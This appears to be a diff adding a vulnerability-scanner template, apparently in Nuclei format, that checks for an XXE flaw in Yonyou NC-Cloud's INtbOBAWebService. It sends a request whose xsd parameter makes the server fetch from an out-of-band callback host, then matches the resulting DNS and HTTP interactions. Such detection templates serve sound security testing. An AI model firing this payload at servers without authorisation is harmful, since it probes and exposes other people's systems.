@@ -1,0 +1,25 @@
+id: poc-yaml-yonyou-nc-cloud-intboba-webservice-xxe
+info:
+  name: 用友NC-Cloud INtbOBAWebService XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: GET
+    path:
+      - "/uapws/service/nc.itf.tb.oba.INtbOBAWebService?xsd=http://{{reverse}}/win2.xml"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: interactsh_request
+        words:
+          - "win2.xml"
